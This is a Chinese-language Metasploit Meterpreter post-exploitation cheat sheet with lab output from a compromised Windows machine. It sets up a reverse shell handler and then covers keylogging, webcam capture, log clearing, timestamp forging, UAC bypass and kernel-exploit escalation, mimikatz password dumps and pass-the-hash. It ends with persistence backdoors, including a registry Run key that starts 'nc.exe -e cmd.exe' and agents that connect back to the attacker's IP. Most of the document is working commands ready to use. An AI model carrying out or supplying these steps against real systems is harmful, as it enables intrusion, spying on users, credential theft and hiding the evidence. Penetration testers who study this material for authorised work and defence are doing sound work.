# meterpreter命令

首先需要先获取meterpreter：

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.81.160
set ExitOnSession false
exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)
jobs  # 查看后台攻击任务 
kill <id>  # 停止某后台攻击任务 
sessions -l  # (查看会话)
sessions -i 2   # 选择会话
sessions -k 2   # 结束会话
```

获取到了meterpreter，就可以进行后渗透了。

#### 1 基本系统命令

```bash
# 会话管理
background  #将当前会话放置后台
sessions  # 查看会话
sessions -i  # 切换会话
quit  # 关闭当前的会话，返回msf终端

# 系统设置
sysinfo  # 查看目标机系统信息
idletime  # 查看目标机闲置时间
reboot/shutdown   # 重启/关机

# shell
shell  # 获得控制台权限
irb  # 进入ruby终端

# 进程迁移
getpid    # 获取当前进程的pid
ps   # 查看当前活跃进程
migrate <pid值>    #将Meterpreter会话移植到指定pid值进程中
kill <pid值>   #杀死进程
migrate <pid值>    #将Meterpreter会话移植到指定pid值进程中

# 执行文件
execute #在目标机中执行文件
execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互

# 摄像头命令
webcam_list  #查看摄像头列表
webcam_chat  # 查看摄像头接口
webcam_snap   #通过摄像头拍照
webcam_stream   #通过摄像头开启视频

# uictl开关键盘/鼠标
uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标
uictl disable mouse  #禁用鼠标
uictl disable keyboard  #禁用键盘

# 远程桌面/截屏
enumdesktops  #查看可用的桌面
getdesktop    #获取当前meterpreter 关联的桌面
screenshot  #截屏
use espia  #或者使用espia模块截屏  然后输入screengrab
run vnc  #使用vnc远程桌面连接

# 键盘记录
keyscan_start  #开始键盘记录
keyscan_dump   #导出记录数据
keyscan_stop #结束键盘记录

# 添加用户，开启远程桌面
# 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令
run post/windows/manage/enable_rdp  #开启远程桌面
run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户
run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662

# 清理日志
clearav  #清除windows中的应用程序日志、系统日志、安全日志
```

#### 2 文件系统命令

```bash
cat/ls/cd/rm  # 基本命令
search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助
getwd/pwd  # 获取当前目录
getlwd/lpwd   # 操作攻击者主机 查看当前目录
upload /tmp/hack.txt C:\\lltest # 上传文件
download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件
edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件
mkdir lltest2  # 只能在当前目录下创建文件夹
rmdir lltest2  # 只能删除当前目录下文件夹
lcd /tmp   # 操作攻击者主机 切换目录

# timestomp伪造文件时间戳
timestomp C:// -h   #查看帮助
timestomp -v C://2.txt   #查看时间戳
timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt
```

#### 3 网络命令

```bash
# 基本
ipconfig/ifconfig
netstat –ano
arp
getproxy   #查看代理信息
route   #查看路由

# portfwd端口转发
portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口
rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码


# autoroute添加路由
run autoroute –h #查看帮助
run autoroute -s 192.168.2.0/24  #添加到目标环境网络
run autoroute –p  #查看添加的路由
# 然后可以利用arp_scanner、portscan等进行扫描
run arp_scanner -r 192.168.2.0/24
run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24
run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0

# Socks4a代理
# autoroute添加完路由后，还可以利用msf自带的sock4a模块进行Socks4a代理
# 先background退出来，然后：
use auxiliary/server/socks4a 
set srvhost 127.0.0.1
set srvport 1080
run
# 然后vi /etc/proxychains.conf #添加 socks4 127.0.0.1 1080
# 最后proxychains 使用Socks4a代理访问

# sniffer抓包
use sniffer
sniffer_interfaces   #查看网卡
sniffer_start 2   #选择网卡 开始抓包
sniffer_stats 2   #查看状态
sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包
sniffer_stop 2   #停止抓包
```

#### 4 信息收集

```bash
# 信息收集的脚本位于：
# modules/post/windows/gather
# modules/post/linux/gather
# 以下列举一些常用的
run post/windows/gather/checkvm #是否虚拟机
run post/linux/gather/checkvm #是否虚拟机
run post/windows/gather/forensics/enum_drives #查看分区
run post/windows/gather/enum_applications #获取安装软件信息
run post/windows/gather/dumplinks   #获取最近的文件操作
run post/windows/gather/enum_ie  #获取IE缓存
run post/windows/gather/enum_chrome   #获取Chrome缓存
run post/windows/gather/enum_patches  #补丁信息
run post/windows/gather/enum_domain  #查找域控
```

#### 5 提权

1.getsystem提权 getsystem工作原理： ①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。 ②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。 ③Windows服务已启动，导致与命名管道建立连接。 ④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。 然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。

```bash
getsystem
```

2.bypassuac

```bash
# 内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限
# use exploit/windows/local/bypassuac
# use exploit/windows/local/bypassuac_injection
# use windows/local/bypassuac_vbs
# use windows/local/ask

# 示例
meterpreter > getuid
Server username: SAUCERMAN\TideSec
meterpreter > background
[*] Backgrounding session 4...
msf5 exploit(multi/handler) >  use exploit/windows/local/bypassuac
msf5 exploit(windows/local/bypassuac) > set SESSION 4
SESSION => 4
msf5 exploit(windows/local/bypassuac) > run

[-] Handler failed to bind to 192.168.81.160:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[*] UAC is Enabled, checking level...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[+] Part of Administrators group! Continuing...
[*] Uploaded the agent to the filesystem....
[*] Uploading the bypass UAC executable to the filesystem...
[*] Meterpreter stager executable 73802 bytes long being uploaded..
[*] Sending stage (206403 bytes) to 192.168.81.154
[*] Meterpreter session 5 opened (192.168.81.160:4444 -> 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700
[-] Exploit failed [timeout-expired]: Timeout::Error execution expired
[*] Exploit completed, but no session was created.

# 然后返回新的meterpreter会话，继续getsystem
# 然鹅这里失败了
```

3.内核漏洞提权

```bash
meterpreter > run post/windows/gather/enum_patches  #查看补丁信息
msf5 > use exploit/windows/local/ms13_053_schlamperei
msf5 > set SESSION 2
msf5 > exploit

# 示例
meterpreter > run post/windows/gather/enum_patches

[+] KB2871997 is missing
[+] KB2928120 is missing
[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)
[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008
[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2
[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity
[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1
[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1
meterpreter > background
[*] Backgrounding session 4...
msf5 exploit(windows/local/bypassuac) > search MS13-081

Matching Modules
================

   #  Name                                             Disclosure Date  Rank     Check  Description
   -  ----                                             ---------------  ----     -----  -----------
   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page


msf5 exploit(windows/local/bypassuac) > use exploit/windows/local/ms13_081_track_popup_menu
msf5 exploit(windows/local/ms13_081_track_popup_menu) > set session 4
session => 4
msf5 exploit(windows/local/ms13_081_track_popup_menu) > exploit

[!] SESSION may not be compatible with this module.
[-] Handler failed to bind to 192.168.81.160:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported
[*] Exploit completed, but no session was created.
# 然鹅失败了，摸摸头
```

#### 6 mimikatz抓取密码

```bash
load mimikatz    #help mimikatz 查看帮助
wdigest  #获取Wdigest密码
mimikatz_command -f samdump::hashes  #执行mimikatz原始命令
mimikatz_command -f sekurlsa::searchPasswords

# 示例
meterpreter > load mimikatz
Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to 'load kiwi' instead?
Success.
meterpreter > wdigest
[!] Not currently running as SYSTEM
[*] Attempting to getprivs ...
[+] Got SeDebugPrivilege.
[*] Retrieving wdigest credentials
wdigest credentials
===================

AuthID    Package    Domain        User           Password
------    -------    ------        ----           --------
0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  
0;996     Negotiate  WORKGROUP     SAUCERMAN$     
0;48748   NTLM                                    
0;999     NTLM       WORKGROUP     SAUCERMAN$     
0;476238  NTLM       SAUCERMAN     TideSec        123456
0;476209  NTLM       SAUCERMAN     TideSec        123456

meterpreter > mimikatz_command -f samdump::hashes
Ordinateur : saucerman
BootKey    : 691cff33caf49e933be97fcee370256a
RegOpenKeyEx SAM : (0x00000005) �ݿ� 
Erreur lors de l'exploration du registre
meterpreter > mimikatz_command -f sekurlsa::searchPasswords
[0] { TideSec ; SAUCERMAN ; 123456 }
[1] { TideSec ; SAUCERMAN ; 123456 }
[2] { SAUCERMAN ; TideSec ; 123456 }
[3] { SAUCERMAN ; TideSec ; 123456 }
[4] { TideSec ; SAUCERMAN ; 123456 }
[5] { TideSec ; SAUCERMAN ; 123456 }
```

#### 7 Hash利用

```bash
# 从SAM导出密码哈希需要SYSTEM权限
run post/windows/gather/smart_hashdump  

# PSExec哈希传递
# 通过smart_hashdump获取用户哈希后，可以利用psexec模块进行哈希传递攻击
# 前提条件：①开启445端口 smb服务；②开启admin$共享
msf5 > use exploit/windows/smb/psexec
msf5 > set payload windows/meterpreter/reverse_tcp
msf5 > set LHOST 192.168.159.134
msf5 > set LPORT 443
msf5 > set RHOST 192.168.159.144
msf5 >set SMBUser Administrator
msf5 >set SMBPass aad3b4*****04ee:5b5f00*****c424c
msf5 >set SMBDomain  WORKGROUP   #域用户需要设置SMBDomain
msf5 >exploit
```

#### 8 假冒令牌

```bash
# 1.incognito假冒令牌
use incognito      #help incognito  查看帮助
list_tokens -u    #查看可用的token
impersonate_token 'NT AUTHORITY\SYSTEM'  #假冒SYSTEM token
或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\
execute -f cmd.exe -i –t    # -t 使用假冒的token 执行
或者直接shell
rev2self   #返回原始token

# 2.steal_token窃取令牌
steal_token <pid值>   #从指定进程中窃取token   先ps
drop_token  #删除窃取的token
```

#### 9 植入后门

Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。

1.persistence启动项后门

在C:\Users_\*_\AppData\Local\Temp\目录下，上传一个vbs脚本，在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项

```bash
run persistence –h  #查看帮助
run persistence -X -i 5 -p 4444 -r 192.168.81.160
#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip
# 示例
meterpreter > run persistence -X -i 5 -p 4444 -r 192.168.81.160

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Running Persistence Script
[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444
[*] Persistent agent script is 99630 bytes long
[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs
[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs
[+] Agent executed with PID 3540
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua
[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua
```

2.metsvc服务后门

在C:\Users_\*_\AppData\Local\Temp\目录下，上传一个vbs脚本 在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项

```bash
run metsvc –A   #自动安装后门

# 示例
meterpreter > run metsvc –A

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Creating a meterpreter service on port 31337
[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...
[*]  >> Uploading metsrv.x86.dll...
[*]  >> Uploading metsvc-server.exe...
[*]  >> Uploading metsvc.exe...
[*] Starting the service...
    Cannot open service manager (0x00000005)

meterpreter > ls
Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH
========================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll
100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe
100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe
```

3.注册表后门

```bash
reg –h # 注册表命令帮助

upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe' #设置键值
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值

nc -v 192.168.81.162 443  #攻击者连接nc后门
```

